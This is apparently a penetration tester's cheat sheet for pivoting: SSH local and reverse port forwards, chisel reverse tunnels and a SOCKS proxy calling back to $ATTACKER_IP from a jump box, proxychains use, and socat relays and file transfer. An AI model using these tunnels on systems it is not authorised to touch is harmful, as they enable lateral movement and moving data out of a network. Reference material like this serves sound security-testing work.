Port forwarding from $TARGET_IP to localhost with SSH
---
```bash
ssh -N -L $PORT:localhost:$PORT $USER@$TARGET_IP
```

```bash
sshpass -p $PASSWORD ssh $USER@$TARGET_IP -L $PORT:127.0.0.1:$PORT
```

or run in background with -f option

```bash
ssh -N -f -L $PORT:localhost:$PORT $USER@$TARGET_IP
```

Forward port from remote machine to local machine:

```bash
service ssh start
```

then on remote machine

```bash
ssh -N -R $REMOTE_PORT:localhost:$PORT $USER@$ATTACKER_IP
```

Using CHISEL:
---
single port on attacker machine

```bash
chisel server --port 8000 --reverse
```

from jump box

```bash
./chisel client $ATTACKER_IP:8000 R:$PORT:$DEST_IP:$PORT
```

 Opening socks5 server on LOCAL machine on port 1080

```bash
chisel server --port 8001 --socks5 --reverse
```

on jump box

```bash
./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
```

Then edit proxychains config:
  
```config
socks5 127.0.0.1 1080
```

Execute commands with

```bash
proxychains -q
```

in front of them

Forward local port to target IP with SOCAT
---
```bash
socat TCP-LISTEN:139,reuseaddr,fork TCP:$TARGET_IP:$PORT &
```

Using SOCAT to send file:
---
On receiving machine

```bash
socat -u TCP-LISTEN:9876,reuseaddr OPEN:$FILE_OUT,creat
```

and on sending machine

```bash
socat -u FILE:$FILE_OUT TCP:$RECEIVER_IP:9876
```